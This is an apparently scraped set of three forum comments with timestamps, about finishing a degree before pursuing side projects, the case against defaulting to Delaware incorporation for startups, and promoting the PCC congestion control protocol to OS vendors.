So shelve them for when you have finished.<p>Giving up within sight of the finish line is wasting your investment of time and money to date.  And in the future not having your diploma might become an issue.<p>Just do the least amount of work that will get you to graduate.  With your diploma in hand you can work on whatever project appeals to you the most.<p>Having been an adjunct in the past, I can assure you that your teachers are more likely to be over-worked and they too only want to do as much work as is necessary to get you to graduate.  Ambitious projects generally need lots more hand-holding and have an increased chance of failing to show sufficient results in the limited time you have available for it.",1412146763

But the percentage of companies that are <i>successful</i> in raising venture capital is extremely low. How low? Probably lower than Y Combinator&#x27;s acceptance rate.<p>For entrepreneurs serious about building a real business, entity selection should be based on what&#x27;s best for the business and the founders, not what&#x27;s going to be required by investors they don&#x27;t yet have and may never have. Generally speaking, young companies have no legitimate incentive to pay Delaware for the privilege of being incorporated in Delaware.<p>So what about companies that are successful in raising money? For early stage startups with little to no revenue and assets (read: most startups), it is quite straightforward to revisit entity selection if necessary with minimal complexity and cost, and with few if any tax consequences. Delaware has a statutory conversion that makes it super simple and inexpensive to convert a Delaware LLC to a Delaware corporation. Even conversion of a non-Delaware entity to a Delaware C corporation is a simple task and will not come close to being the most expensive item when you pay your law firm for its work associated with your financing.<p>Of course, if your company has no assets, you could just dissolve if need be. Which, ironically, is what happens to a lot of those Delaware corporations.",1412144867

If you want to convince the world to switch to your approach you&#x27;ll need to do that.<p>At the end most people will just use the default of their OS and will never even consider what happens underneath so you&#x27;ll need to convince the Linux kernel and BSDs that your approach is better overall and viable for the wide internet.<p>One thing I failed to take account before is that most transfers are affected by the congestion control on the server and less so on the client (besides uploads) so you really need to focus on the OS vendors to implement PCC in their OS and possibly make it a default. Linux has a configurable congestion control mechanism and I added H-TCP to it back at the time. Wasn&#x27;t too much work either.<p>I don&#x27;t really buy the ISP response argument, they will fail to do it early enough and will only get to it when things break severely enough and then their response will be overly aggressive.<p>It would be useful however to maybe add a mode detection to PCC that will throttle it somewhat to not take full bandwidth in order to leave some space for legacy TCP. It will add complexity to PCC and this needs to be balanced but at the end you&#x27;ll need to do what it takes to get PCC beyond closed networks and into the internet and you have many gatekeepers to convince.",1412143278
